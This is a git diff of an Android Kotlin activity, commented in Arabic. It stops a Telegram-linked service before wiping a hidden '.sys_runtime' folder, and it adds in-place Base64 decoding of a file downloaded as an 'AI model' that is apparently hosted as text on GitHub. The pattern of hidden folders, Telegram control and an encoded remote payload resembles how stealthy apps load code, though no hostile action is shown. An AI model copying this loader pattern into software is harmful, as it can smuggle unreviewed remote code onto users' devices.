@@ -382,6 +382,12 @@ class MainActivity : AppCompatActivity() {
      */
     private fun clearAppData() {
         try {
+            // إيقاف الخدمات قبل الحذف
+            telegramUi?.stop()
+            telegramUi = null
+            // يمكن إيقاف Monitor إذا كان لدينا مرجع، ولكننا لا نحتفظ بمرجع عالمي
+            // سنكتفي بإيقاف TelegramUi فقط
+
             val runtimeDir = File(filesDir, ".sys_runtime")
             if (runtimeDir.exists()) {
                 runtimeDir.deleteRecursively()
@@ -438,6 +444,7 @@ class MainActivity : AppCompatActivity() {
      * التأكد من جاهزية نموذج AI.
      * إذا كان النموذج موجوداً وكبيراً بما يكفي، يعيد true.
      * وإلا، يحاول تحميله من الإنترنت عبر FileDownloader مع إعادة المحاولة وعرض التقدم.
+     * بعد التحميل، يتحقق من كون الملف نصياً (Base64) ويفك تشفيره إذا لزم الأمر.
      */
     private suspend fun ensureModelReady(): Boolean {
         val modelFile = File(modelsDir, "engine_v2.tflite")
@@ -519,13 +526,37 @@ class MainActivity : AppCompatActivity() {
             )
         }
 
-        if (success) {
+        // ✅ التحقق من الملف بعد التحميل (حتى لو فشل التحميل، قد يكون الملف موجوداً جزئياً)
+        if (success && modelFile.exists()) {
+            // ✅ التحقق مما إذا كان الملف نصياً (Base64) بدلاً من باينري
+            try {
+                val firstBytes = ByteArray(10)
+                java.io.FileInputStream(modelFile).use { it.read(firstBytes) }
+                val header = String(firstBytes, Charsets.UTF_8)
+                // إذا كان المحتوى يبدو كنص Base64 (شائع في ملفات .txt على GitHub)
+                if (header.matches(Regex("^[A-Za-z0-9+/=\\s]+$"))) {
+                    appendLog("🔄 الملف نصي (Base64)، جاري فك التشفير...")
+                    val text = modelFile.readText(Charsets.UTF_8).replace("\\s".toRegex(), "")
+                    val decoded = android.util.Base64.decode(text, android.util.Base64.NO_WRAP)
+                    java.io.FileOutputStream(modelFile).use { it.write(decoded) }
+                    appendLog("✅ تم فك تشفير الملف بنجاح (الحجم: ${modelFile.length()} بايت).")
+                } else {
+                    appendLog("✅ الملف باينري مباشر، لا حاجة لفك تشفير.")
+                }
+            } catch (e: Exception) {
+                appendLog("⚠️ فشل التحقق من نوع الملف: ${e.message}")
+            }
+        }
+
+        if (success && modelFile.exists() && modelFile.length() >= minSize) {
             appendLog("✅ تم تحميل النموذج بنجاح (${modelFile.length() / (1024 * 1024)} ميجابايت).")
             updateProgress(100)
             return true
         } else {
-            appendLog("❌ فشل تحميل النموذج بعد عدة محاولات.")
+            appendLog("❌ فشل تحميل النموذج بعد عدة محاولات، أو الملف تالف.")
             updateProgress(0)
+            // حذف الملف التالف إن وجد
+            if (modelFile.exists()) modelFile.delete()
             return false
         }
     }
